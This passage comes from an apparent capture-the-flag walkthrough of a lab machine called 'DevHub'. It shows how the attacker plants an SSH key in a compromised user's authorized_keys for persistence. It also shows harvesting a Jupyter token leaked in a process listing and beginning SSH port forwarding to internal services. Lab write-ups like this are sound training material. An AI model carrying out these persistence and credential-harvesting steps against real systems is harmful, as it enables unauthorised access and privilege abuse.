※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement

### 4.1 SSH Persistence

#### 4.1.1 Set up SSH persistence

Before chasing lateral movement, SSH persistence was established to avoid relying on the fragile reverse shell connection. 

Reverse shells die easily — if the HTTP request times out or the Inspector process restarts, you lose access. Before doing anything else, get stable SSH access.

On your Kali Machine (a separate terminal, NOT the rev shell):
(don't close the reverse shell)

**Command:** `ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""`

**Breakdown:**

- `ssh-keygen` — Generate an SSH key pair.
- `-t ed25519` — Use the Ed25519 algorithm, which is compact and modern.
- `-f /tmp/devhub_key` — Output path for the private key; the public key is written to the same path with `.pub` appended.
	
	`/tmp` is just a convenient scratch space:
	1. Always writable : Every user has write access to `/tmp` regardless of permissions elsewhere. You don't need to worry about permission errors.
	2. Doesn't clutter your home directory: Keeps temporary engagement files (keys, payloads, downloaded tools) separate from your normal files.
	3. Convention/habit: Pentesters use `/tmp` by default for anything short-lived — generated keys, exploit scripts, downloaded binaries, exfiltrated files.
	4. Easy cleanup: `/tmp` typically gets cleared on reboot, so temporary engagement artifacts don't persist indefinitely.
	
	Could you put the key anywhere else?
	
	Yes — `-f /home/kali/DevHub/devhub_key` or anywhere in your home directory works just as well. The only thing that matters is:
	- You remember the path for the `-i` flag
	- The private key file has permissions 600 (SSH refuses to use keys that are too open)
	
	`/tmp` is just the path of least resistance — no real technical requirement behind it for this step.
	
- `-N ""` — Empty passphrase for automated use.


**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ssh-keygen -t ed25519 -f /tmp/devhub_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/devhub_key
Your public key has been saved in /tmp/devhub_key.pub
The key fingerprint is:
SHA256:ce1a3Zb/UJapSmDniI4vCCAyzUtYTf+DGrLYlUvRKI8 kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|   o.            |
|  . .+     .     |
| =. o o . . .    |
|* ++ o o o . . .+|
|+oE.* . So .o .+=|
| +.= +  o.=o  .+.|
|. + +  . ..o .. .|
|   . .o   . .  ..|
|     .oo   .    .|
+----[SHA256]-----+
```

Copy that public key output:

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ cat /tmp/devhub_key.pub                                     
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXCRDWy+cnJKl6BnM1X3YT0ZF/w164eLNqPPI2iSgTf kali@kali
```

Then back in the reverse shell (on the target, as mcp-dev) run the following 4 commands:

**Command 1:**

`mkdir -p /home/mcp-dev/.ssh`

Breakdown:

- `mkdir`
  - Description: Creates a new directory.
  - Purpose: SSH looks for authorized keys inside a .ssh folder in the user's home directory. This folder doesn't exist by default, so it must be created first.
- `-p`
  - Description: "Parents" flag — creates any missing parent directories in the path, and doesn't error if the directory already exists.
  - Purpose: Safety net. If `/home/mcp-dev/.ssh` already existed, `-p` prevents an error from stopping the command. It also ensures `/home/mcp-dev` exists if it somehow didn't.
- `/home/mcp-dev/.ssh`
  - Description: The path being created — a hidden directory (dot-prefix) inside mcp-dev's home.
  - Purpose: This is the exact location SSH checks for authorized_keys when mcp-dev tries to log in.

**Result:**

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ mkdir -p /home/mcp-dev/.ssh
<ules/@mcpjam/inspector$ mkdir -p /home/mcp-dev/.ssh  
```

**Command 2:**

`echo 'PASTE_THE_PUBLIC_KEY_HERE' >> /home/mcp-dev/.ssh/authorized_keys`

**Breakdown:**

- `echo 'PASTE_THE_PUBLIC_KEY_HERE'`
  - Description: Prints the given string (your SSH public key) to standard output.
  - Purpose: The public key is the "lock" — anyone whose private key matches it is allowed to log in. We need to write this string into a file SSH reads.
- `>>`
  - Description: Append redirect — adds output to the end of a file without erasing existing content.
  - Purpose: Using >> instead of > (overwrite) ensures we don't destroy any keys that might already be in authorized_keys. Critical — > could lock out legitimate access or wipe existing entries.
- `/home/mcp-dev/.ssh/authorized_keys`
  - Description: The file SSH checks against when a client tries to authenticate with a key.
  - Purpose: This is where our public key needs to live for SSH to accept our private key (devhub_key) as valid for mcp-dev.

**Result:**

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXCRDWy+cnJKl6BnM1X3YT0ZF/w164eLNqPPI2iSgTf kali@kali' >> /home/mcp-dev/.ssh/authorized_keys
<f kali@kali'  >> /home/mcp-dev/.ssh/authorized_keys  
```

**Command 3:**

`chmod 700 /home/mcp-dev/.ssh`

Breakdown:

- `chmod`
  - Description: Changes file/directory permissions.
  - Purpose: SSH is strict about permissions on .ssh and its contents — if they're too 
- `700`
  - Description: Permission mode — owner gets read/write/execute (7), group and others get nothing (0, 0).
  - Purpose: Only mcp-dev can access this directory at all. Satisfies SSH's strict permission requirement for the .ssh folder.
- `/home/mcp-dev/.ssh`
  - Description: The target directory.
  - Purpose: Same directory created in command 1 — now locking it down.

**Command 4:**

`chmod 600 /home/mcp-dev/.ssh/authorized_keys`

**Breakdown:**

- `chmod`
  - Description: Changes file/directory permissions.
  - Purpose: Same as above — SSH also checks permissions on the authorized_keys file itself, separately from the directory.
- `600`
  - Description: Permission mode — owner gets read/write (6), group and others get nothing.
  - Purpose: No execute permission needed (it's a text file, not a script), and no one but mcp-dev should be able to read or modify it. If group/others had write access, SSH would reject the file as insecure (anyone could add their own key).
- `/home/mcp-dev/.ssh/authorized_keys`
  - Description: The target file.
  - Purpose: The file created/appended-to in command 2 — now locking it down to meet SSH's security requirements.

Why both `chmod` commands matter:

If either the directory (700) or the file (600) has looser permissions, SSH will silently refuse to use the key and fall back to password auth — even if everything else is correct. This is one of the most common reasons "SSH key auth isn't working" on a freshly set up box.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 4.1.2 Verify SSH works

From Kali:

`ssh -i /tmp/devhub_key mcp-dev@10.129.245.216`

**Breakdown:**

- `ssh`
  - Description: Secure Shell client — opens an encrypted remote login session to another machine.
  - Purpose: This is how we connect to the target now instead of relying on the fragile reverse shell.
- `-i /tmp/devhub_key`
  - Description: "Identity file" flag — tells SSH which private key to use for authentication.
  - Purpose: SSH needs to prove our identity using the private key that matches the public key we placed in authorized_keys on the target. Without `-i`, SSH would try its default keys (`~/.ssh/id_rsa`, etc.) and fail, falling back to password auth — which we don't have.
- `mcp-dev@10.129.245.216`
  - Description: `user@host` syntax — specifies which user account to log in as, and which machine to connect to.
  - Purpose: `mcp-dev` is the account whose authorized_keys we modified via the reverse shell, and `10.129.245.216` is the DevHub target IP.

If that drops you into a clean shell as mcp-dev, you have stable persistent access and can let the reverse shell go.

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ssh -i /tmp/devhub_key mcp-dev@10.129.245.216 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jun 10 08:42:11 AM UTC 2026

  System load:           0.0
  Usage of /:            76.4% of 9.50GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.216
  IPv6 address for eth0: dead:beef::a0de:adff:fee0:5010


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Jun 10 08:42:13 2026 from 10.10.14.85
mcp-dev@devhub:~$ 
```

What the output confirms:

- No password prompt, no "permission denied" — key-based auth succeeded
- Last login: ... from 10.10.14.85 — that's your Kali tun0 IP, confirming this connection came from you
- You're now at mcp-dev@devhub:~$ — a clean, stable, fully-interactive shell with proper terminal handling (no more pty.spawn needed)
uname
You can now safely close the reverse shell / netcat listener. From here on, all commands will run through this SSH session.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Process Table — Credential Leak

**Command:** `ps auxww`

**Breakdown:**

- `ps`
  - Description: Reports a snapshot of currently running processes.
  - Purpose: Same as before — but this time we filter and avoid truncation.
- `aux`
  - Description: a = show processes for all users, u = display in user-oriented format (shows USER, %CPU, %MEM columns), x = include processes without a controlling terminal.
  - Purpose: Same as your original command — needed to see processes owned by analyst and root, not just your own.
- `ww`
  - Description: "Wide" flag, doubled. A single w widens output to 132 columns; doubling it (ww) removes the line-width limit entirely, showing the full, unteruncated command line no matter how long.
  - Purpose: This is the critical addition. The Jupyter command line includes flags like --ServerApp.token=... which can be 100+ characters — without ww, ps aux cuts it off.

**Result:**

```shell
mcp-dev@devhub:~$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166424 11704 ?        Ss   05:00   0:02 /sbin/init
root           2  0.0  0.0      0     0 ?        S    05:00   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   05:00   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   05:00   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   05:00   0:00 [slub_flushwq]
root           6  0.0  0.0      0     0 ?        I<   05:00   0:00 [netns]
root           8  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/0:0H-events_highpri]
root          10  0.0  0.0      0     0 ?        I<   05:00   0:00 [mm_percpu_wq]
root          11  0.0  0.0      0     0 ?        S    05:00   0:00 [rcu_tasks_rude_]
root          12  0.0  0.0      0     0 ?        S    05:00   0:00 [rcu_tasks_trace]
root          13  0.0  0.0      0     0 ?        S    05:00   0:00 [ksoftirqd/0]
root          14  0.0  0.0      0     0 ?        I    05:00   0:04 [rcu_sched]
root          15  0.0  0.0      0     0 ?        S    05:00   0:00 [migration/0]
root          16  0.0  0.0      0     0 ?        S    05:00   0:00 [idle_inject/0]
root          17  0.0  0.0      0     0 ?        I    05:00   0:00 [kworker/0:1-cgroup_release]
root          18  0.0  0.0      0     0 ?        S    05:00   0:00 [cpuhp/0]
root          19  0.0  0.0      0     0 ?        S    05:00   0:00 [cpuhp/1]
root          20  0.0  0.0      0     0 ?        S    05:00   0:00 [idle_inject/1]
root          21  0.0  0.0      0     0 ?        S    05:00   0:00 [migration/1]
root          22  0.0  0.0      0     0 ?        S    05:00   0:00 [ksoftirqd/1]
root          24  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/1:0H-events_highpri]
root          25  0.0  0.0      0     0 ?        S    05:00   0:00 [kdevtmpfs]
root          26  0.0  0.0      0     0 ?        I<   05:00   0:00 [inet_frag_wq]
root          27  0.0  0.0      0     0 ?        S    05:00   0:00 [kauditd]
root          28  0.0  0.0      0     0 ?        S    05:00   0:00 [khungtaskd]
root          29  0.0  0.0      0     0 ?        S    05:00   0:00 [oom_reaper]
root          30  0.0  0.0      0     0 ?        I<   05:00   0:00 [writeback]
root          31  0.0  0.0      0     0 ?        S    05:00   0:00 [kcompactd0]
root          32  0.0  0.0      0     0 ?        SN   05:00   0:00 [ksmd]
root          33  0.0  0.0      0     0 ?        SN   05:00   0:00 [khugepaged]
root          80  0.0  0.0      0     0 ?        I<   05:00   0:00 [kintegrityd]
root          81  0.0  0.0      0     0 ?        I<   05:00   0:00 [kblockd]
root          82  0.0  0.0      0     0 ?        I<   05:00   0:00 [blkcg_punt_bio]
root          83  0.0  0.0      0     0 ?        I<   05:00   0:00 [tpm_dev_wq]
root          84  0.0  0.0      0     0 ?        I<   05:00   0:00 [ata_sff]
root          85  0.0  0.0      0     0 ?        I<   05:00   0:00 [md]
root          86  0.0  0.0      0     0 ?        I<   05:00   0:00 [edac-poller]
root          87  0.0  0.0      0     0 ?        I<   05:00   0:00 [devfreq_wq]
root          88  0.0  0.0      0     0 ?        S    05:00   0:00 [watchdogd]
root          90  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/1:1H-kblockd]
root          92  0.0  0.0      0     0 ?        S    05:00   0:00 [kswapd0]
root          93  0.0  0.0      0     0 ?        S    05:00   0:00 [ecryptfs-kthrea]
root          95  0.0  0.0      0     0 ?        I<   05:00   0:00 [kthrotld]
root          96  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/24-pciehp]
root          97  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/25-pciehp]
root          98  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/26-pciehp]
root          99  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/27-pciehp]
root         100  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/28-pciehp]
root         101  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/29-pciehp]
root         102  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/30-pciehp]
root         103  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/31-pciehp]
root         104  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/32-pciehp]
root         105  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/33-pciehp]
root         106  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/34-pciehp]
root         107  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/35-pciehp]
root         108  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/36-pciehp]
root         109  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/37-pciehp]
root         110  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/38-pciehp]
root         111  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/39-pciehp]
root         112  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/40-pciehp]
root         113  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/41-pciehp]
root         114  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/42-pciehp]
root         115  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/43-pciehp]
root         116  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/44-pciehp]
root         117  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/45-pciehp]
root         118  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/46-pciehp]
root         119  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/47-pciehp]
root         120  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/48-pciehp]
root         121  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/49-pciehp]
root         122  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/50-pciehp]
root         123  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/51-pciehp]
root         124  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/52-pciehp]
root         125  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/53-pciehp]
root         126  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/54-pciehp]
root         127  0.0  0.0      0     0 ?        S    05:00   0:00 [irq/55-pciehp]
root         128  0.0  0.0      0     0 ?        I<   05:00   0:00 [acpi_thermal_pm]
root         130  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_0]
root         131  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_0]
root         132  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_1]
root         133  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_1]
root         135  0.0  0.0      0     0 ?        I<   05:00   0:00 [vfio-irqfd-clea]
root         136  0.0  0.0      0     0 ?        I<   05:00   0:00 [mld]
root         137  0.0  0.0      0     0 ?        I<   05:00   0:00 [ipv6_addrconf]
root         148  0.0  0.0      0     0 ?        I<   05:00   0:00 [kstrp]
root         151  0.0  0.0      0     0 ?        I<   05:00   0:00 [zswap-shrink]
root         152  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/u5:0]
root         157  0.0  0.0      0     0 ?        I<   05:00   0:00 [charger_manager]
root         202  0.0  0.0      0     0 ?        I<   05:00   0:00 [kworker/0:1H-kblockd]
root         203  0.0  0.0      0     0 ?        I<   05:00   0:00 [mpt_poll_0]
root         204  0.0  0.0      0     0 ?        I<   05:00   0:00 [mpt/0]
root         205  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_2]
root         207  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_2]
root         208  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_3]
root         209  0.0  0.0      0     0 ?        I<   05:00   0:00 [ttm_swap]
root         210  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_3]
root         211  0.0  0.0      0     0 ?        S    05:00   0:02 [irq/16-vmwgfx]
root         212  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_4]
root         213  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc0]
root         214  0.0  0.0      0     0 ?        I<   05:00   0:00 [cryptd]
root         215  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_4]
root         216  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc1]
root         220  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc2]
root         223  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc3]
root         227  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc4]
root         230  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_5]
root         233  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_5]
root         235  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc5]
root         236  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_6]
root         238  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc6]
root         240  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_6]
root         241  0.0  0.0      0     0 ?        S    05:00   0:00 [card0-crtc7]
root         244  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_7]
root         246  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_7]
root         248  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_8]
root         250  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_8]
root         252  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_9]
root         253  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_9]
root         255  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_10]
root         256  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_10]
root         257  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_11]
root         258  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_11]
root         261  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_12]
root         263  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_12]
root         264  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_13]
root         276  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_13]
root         277  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_14]
root         278  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_14]
root         280  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_15]
root         281  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_15]
root         283  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_16]
root         284  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_16]
root         286  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_17]
root         288  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_17]
root         290  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_18]
root         292  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_18]
root         294  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_19]
root         295  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_19]
root         296  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_20]
root         298  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_20]
root         299  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_21]
root         303  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_21]
root         304  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_22]
root         305  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_22]
root         306  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_23]
root         307  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_23]
root         308  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_24]
root         309  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_24]
root         310  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_25]
root         311  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_25]
root         312  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_26]
root         313  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_26]
root         314  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_27]
root         315  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_27]
root         316  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_28]
root         317  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_28]
root         318  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_29]
root         319  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_29]
root         320  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_30]
root         321  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_30]
root         322  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_31]
root         323  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_31]
root         351  0.0  0.0      0     0 ?        S    05:00   0:00 [scsi_eh_32]
root         352  0.0  0.0      0     0 ?        I<   05:00   0:00 [scsi_tmf_32]
root         380  0.0  0.0      0     0 ?        I<   05:00   0:00 [kdmflush]
root         406  0.0  0.0      0     0 ?        I<   05:00   0:00 [raid5wq]
root         454  0.0  0.0      0     0 ?        S    05:00   0:00 [jbd2/dm-0-8]
root         455  0.0  0.0      0     0 ?        I<   05:00   0:00 [ext4-rsv-conver]
root         515  0.0  1.7 126292 68212 ?        S<s  05:00   0:03 /lib/systemd/systemd-journald
root         543  0.0  0.0      0     0 ?        I<   05:01   0:00 [kaluad]
root         547  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpath_rdacd]
root         548  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpathd]
root         550  0.0  0.0      0     0 ?        I<   05:01   0:00 [kmpath_handlerd]
root         551  0.0  0.6 289456 27236 ?        SLsl 05:01   0:02 /sbin/multipathd -d -s
root         555  0.0  0.1  26836  7752 ?        Ss   05:01   0:00 /lib/systemd/systemd-udevd
root         673  0.0  0.0      0     0 ?        S    05:01   0:00 [jbd2/sda2-8]
root         675  0.0  0.0      0     0 ?        I<   05:01   0:00 [ext4-rsv-conver]
systemd+     730  0.0  0.3  26340 13268 ?        Ss   05:01   0:00 /lib/systemd/systemd-resolved
systemd+     734  0.0  0.1  89364  6584 ?        Ssl  05:01   0:01 /lib/systemd/systemd-timesyncd
root         753  0.0  0.0  85380  2508 ?        S<sl 05:01   0:01 /sbin/auditd
_laurel      758  0.0  0.1   9992  6120 ?        S<   05:01   0:02 /usr/local/sbin/laurel --config /etc/laurel/config.toml
root         801  0.0  0.2  51160 11876 ?        Ss   05:01   0:00 /usr/bin/VGAuthService
root         802  0.1  0.2 242348 10200 ?        Ssl  05:01   0:28 /usr/bin/vmtoolsd
root         813  0.0  0.0      0     0 ?        S    05:01   0:00 [audit_prune_tre]
root         852  0.0  0.1 101244  5900 ?        Ssl  05:01   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
message+     891  0.0  0.1   8804  4768 ?        Ss   05:01   0:00 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root         896  0.0  0.0  82840  3852 ?        Ssl  05:01   0:01 /usr/sbin/irqbalance --foreground
root         897  0.0  0.4  32728 19652 ?        Ss   05:01   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         898  0.0  0.1 234512  6804 ?        Ssl  05:01   0:00 /usr/libexec/polkitd --no-debug
syslog       899  0.0  0.1 222404  5632 ?        Ssl  05:01   0:00 /usr/sbin/rsyslogd -n -iNONE
root         901  0.0  0.8 1326808 35996 ?       Ssl  05:01   0:02 /usr/lib/snapd/snapd
root         903  0.0  0.1  15368  7432 ?        Ss   05:01   0:00 /lib/systemd/systemd-logind
root         904  0.0  0.3 392628 12820 ?        Ssl  05:01   0:00 /usr/libexec/udisks2/udisksd
root         928  0.0  0.3 317980 12076 ?        Ssl  05:01   0:00 /usr/sbin/ModemManager
analyst     1054  0.0  2.4 182524 96588 ?        Ss   05:01   0:07 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
mcp-dev     1056  0.0  1.8 1720736 74312 ?       Ssl  05:01   0:01 npm start
root        1059  0.0  0.0   6896  2864 ?        Ss   05:01   0:00 /usr/sbin/cron -f -P
root        1061  0.0  0.7  37376 28796 ?        Ss   05:01   0:05 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
root        1073  0.0  0.0   6176  1120 tty1     Ss+  05:01   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1081  0.0  0.2  15440  8684 ?        Ss   05:01   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root        1118  0.0  0.0  55240  1676 ?        Ss   05:01   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
www-data    1119  0.0  0.1  55872  5456 ?        S    05:01   0:00 nginx: worker process
www-data    1120  0.0  0.1  55872  5456 ?        S    05:01   0:00 nginx: worker process
mcp-dev     1253  0.0  0.0   2892   940 ?        S    05:01   0:00 sh -c npx @mcpjam/inspector@1.4.2
mcp-dev     1254  0.0  2.4 1738648 96964 ?       Sl   05:01   0:04 npm exec @mcpjam/inspector@1.4.2
mcp-dev     1270  0.0  0.0   2892   960 ?        S    05:01   0:00 sh -c "inspector"
mcp-dev     1271  0.0  1.3 1441876 52164 ?       Sl   05:01   0:00 node /opt/mcpjam/node_modules/.bin/inspector
mcp-dev     1290  0.0  3.5 2225328 142716 ?      Sl   05:01   0:03 node /opt/mcpjam/node_modules/@mcpjam/inspector/dist/server/index.js
root        1403  0.0  0.0      0     0 ?        I    05:15   0:09 [kworker/0:2-events]
root        1592  0.0  0.0      0     0 ?        I    06:16   0:07 [kworker/1:2-events_freezable]
mcp-dev     1613  0.0  0.1   8916  5092 ?        S    06:19   0:00 /bin/bash -i
root        1722  0.0  0.0      0     0 ?        I    07:48   0:00 [kworker/u4:2-events_unbound]
root        1763  0.0  0.0      0     0 ?        I    08:22   0:00 [kworker/u4:1-events_power_efficient]
root        1789  0.0  0.2  16924 10688 ?        Ss   08:42   0:00 sshd: mcp-dev [priv]
mcp-dev     1792  0.0  0.2  17192  9708 ?        Ss   08:42   0:00 /lib/systemd/systemd --user
mcp-dev     1793  0.0  0.0 169352  3908 ?        S    08:42   0:00 (sd-pam)
root        1795  0.0  0.0      0     0 ?        I    08:42   0:00 [kworker/1:0-events]
mcp-dev     1898  0.0  0.2  17216  8020 ?        S    08:42   0:00 sshd: mcp-dev@pts/0
mcp-dev     1901  0.0  0.1   8660  5472 pts/0    Ss   08:42   0:00 -bash
root        1941  0.0  0.0      0     0 ?        I    08:54   0:00 [kworker/u4:0-events_unbound]
mcp-dev     1981  0.0  0.0  10072  1568 pts/0    R+   09:27   0:00 ps auxww
```

**Key findings:** Two critical discoveries in one command:

1. **Jupyter token leaked in plaintext:** `--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7` — passed as a CLI argument, visible to any user with `ps` access.
	
	Why this is exploitable:
	
	On Linux, a process's full command line — including every argument passed to it — is stored in `/proc/<pid>/cmdline` and is world-readable via `ps aux` by any user on the system, regardless of who owns the process.
	
	Jupyter's `--ServerApp.token` flag is the authentication secret for its REST and WebSocket API. Anyone with this token can authenticate to Jupyter as analyst and execute arbitrary Python code through it — equivalent to a shell as analyst.
	
	This is a textbook example of a secrets-in-process-arguments leak: a developer started Jupyter with the token as a CLI flag (convenient for scripting/automation) without realizing every other user on the box can read it.

2. **OPSMCP runs as root:** PID 1061, launched by root — any code it executes runs with full system privileges.

This is a classic process argument credential leak. Jupyter's `--ServerApp.token` flag is passed on the command line rather than being read from an environment variable or config file, making it visible to all local users via `/proc/<pid>/cmdline` and `ps aux`.

### 4.3 SSH Port Forwarding — Tunnel to Internal Services

With SSH access as `mcp-dev` and the Jupyter token in hand, SSH port forwarding was used to bring the internal services to the attacker machine.

**Command:** `ssh -i devhub_key -L 18888:127.0.0.1:8888 -L 15000:127.0.0.1:5000 mcp-dev@TARGET_IP -N -f`

**Breakdown:**
